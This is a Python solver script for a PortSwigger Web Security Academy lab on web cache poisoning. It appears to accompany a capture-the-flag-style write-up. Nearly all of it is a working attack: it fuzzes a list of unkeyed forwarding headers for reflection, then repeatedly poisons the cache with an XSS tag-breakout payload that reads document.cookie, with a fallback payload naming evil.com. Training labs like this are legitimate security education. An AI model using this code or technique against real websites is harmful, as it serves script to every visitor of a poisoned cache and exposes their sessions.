#!/usr/bin/env python3
"""
Web cache poisoning with an unkeyed header
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 01-unkeyed-header.md

What this does:
    Confirms X-Forwarded-Host is reflected into a resource-import URL but is
    not part of the cache key, then poisons the cache with a tag-breakout
    payload in the header value. Since the cache expires roughly every 30
    seconds, it loops the poisoning request so a fresh copy is always sitting
    in the cache whenever the lab's simulated visitor loads the page.

Usage:
    python 01-unkeyed-header.py <lab-url>
    e.g. python 01-unkeyed-header.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import asyncio
import secrets
import sys
import httpx

UNKEYED_HEADER_CANDIDATES = [
    "X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-Original-URL",
    "X-Rewrite-URL", "X-Forwarded-Scheme", "X-Forwarded-Proto",
    "X-Forwarded-Port", "X-Forwarded-Prefix", "X-Original-Host",
    "Forwarded", "X-Custom-IP-Authorization",
]


def _cache_buster() -> str:
    return secrets.token_hex(4)


def _is_cache_miss(headers: dict) -> bool:
    xc = headers.get("x-cache", "").lower()
    cf = headers.get("cf-cache-status", "").lower()
    return "miss" in xc or "miss" in cf


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def poison_via_header(client: httpx.AsyncClient, url: str, header_name: str,
                             payload: str, max_attempts: int = 30) -> bool:
    """Send poisoning request, then verify a clean request returns poisoned content."""
    print(f"[*] Poisoning {url} via {header_name}: {payload[:60]}...")
    for attempt in range(max_attempts):
        r = await client.get(url, headers={header_name: payload})
        if _is_cache_miss(dict(r.headers)):
            await asyncio.sleep(0.2)
            verify = await client.get(url)
            if payload in verify.text:
                print(f"[+] Cache poisoned on attempt {attempt + 1}!")
                return True
        await asyncio.sleep(0.5)
    print(f"[-] Failed to poison cache after {max_attempts} attempts")
    return False


async def solve(lab_url: str) -> None:
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
        # Step 1: confirm X-Forwarded-Host is reflected (fall back to fuzzing
        # the wider candidate list if this particular lab instance differs).
        cb = _cache_buster()
        r = await client.get(f"{lab_url}/?cb={cb}",
                              headers={"X-Forwarded-Host": "test-canary.com"})
        header_name = "X-Forwarded-Host"
        if "test-canary.com" not in r.text:
            print("[-] X-Forwarded-Host not reflected -- trying other headers")
            for hdr in UNKEYED_HEADER_CANDIDATES:
                r = await client.get(f"{lab_url}/?cb={_cache_buster()}",
                                      headers={hdr: "test-canary.com"})
                if "test-canary.com" in r.text:
                    header_name = hdr
                    print(f"[+] Found reflected header: {hdr}")
                    break
            else:
                print("[-] No unkeyed header reflected -- cannot proceed")
                return
        else:
            print(f"[+] {header_name} is reflected and unkeyed")

        # Step 2: poison with a direct tag-breakout payload (this lab's
        # reflection context permits it -- no exploit server needed).
        xss_payload = '"></script><script>alert(document.cookie)</script>'
        poisoned = await poison_via_header(client, lab_url, header_name, xss_payload)

        if not poisoned:
            # Fallback shape some lab instances need: full hostname + breakout.
            xss_payload = 'evil.com"></script><script>alert(document.cookie)</script>'
            poisoned = await poison_via_header(client, lab_url, header_name, xss_payload)

        if not poisoned:
            print("[-] Not solved -- cache never confirmed a poisoned miss")
            return

        await asyncio.sleep(3)
        if await _lab_solved(client, lab_url):
            print("[+] Lab solved -- poisoned response served to a clean request.")
        else:
            print("[-] Not solved yet -- poison landed but the simulated visitor hasn't hit it.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/")))
